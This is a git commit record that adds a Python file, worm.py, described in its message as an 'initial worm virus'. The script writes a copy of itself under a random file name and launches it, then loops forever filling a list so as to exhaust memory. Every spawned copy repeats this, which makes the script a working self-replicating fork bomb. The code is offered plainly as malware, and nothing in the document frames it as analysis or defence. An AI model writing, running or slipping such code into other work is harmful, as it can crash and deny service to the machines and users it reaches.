1236d3b3d94f2bab6ee19ad83c84c08d0a9b645a
Just_a_Mango <horace.hoff@gmail.com>
2022-07-17 17:16:11 +0200

    Initial worm virus uploaded

---
+++ worm.py
@@ -0,0 +1,13 @@
+import random, subprocess
+worm_id = int(random.random()*10000000000000000)
+with open("worm"+str(worm_id)+".py", "w+") as worm:
+    for line in open(__file__, "r").readlines():
+        worm.write(line)
+subprocess.Popen(["python", "worm"+str(worm_id)+".py"])
+kill_count = []
+try:
+    while True:
+        kill_count.append(str(random.random()))
+        kill_count.append(1)
+except:
+    pass
